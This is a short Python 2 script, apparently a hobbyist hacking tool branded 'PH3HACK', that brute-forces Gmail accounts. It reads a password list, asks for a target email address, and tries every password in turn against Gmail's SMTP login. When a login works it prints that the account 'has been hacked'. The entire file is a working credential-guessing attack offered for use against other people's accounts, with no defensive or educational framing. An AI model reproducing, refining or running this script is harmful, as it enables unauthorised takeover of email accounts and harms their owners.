#!/usr/bin/python
'''PH3HACK'''

import smtplib
from os import system

def main():
   print """


 /$$$$$$$  /$$   /$$  /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$
| $$__  $$| $$  | $$ /$$__  $$| $$  | $$ /$$__  $$ /$$__  $$| $$  /$$/
| $$  \ $$| $$  | $$|__/  \ $$| $$  | $$| $$  \ $$| $$  \__/| $$ /$$/ 
| $$$$$$$/| $$$$$$$$   /$$$$$/| $$$$$$$$| $$$$$$$$| $$      | $$$$$/  
| $$____/ | $$__  $$  |___  $$| $$__  $$| $$__  $$| $$      | $$  $$  
| $$      | $$  | $$ /$$  \ $$| $$  | $$| $$  | $$| $$    $$| $$\  $$ 
| $$      | $$  | $$|  $$$$$$/| $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$
|__/      |__/  |__/ \______/ |__/  |__/|__/  |__/ \______/ |__/  \__/  """
   print '================================================='
   print '               coded by PH3HACK              '
   print '           Subscribe Our YouTube Channel         '
   print '================================================='

main()
print '[1] start the attack'
print '[2] exit'
option = input('Enter Option =>')
if option == 1:
   file_path = raw_input('Enter Password list :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
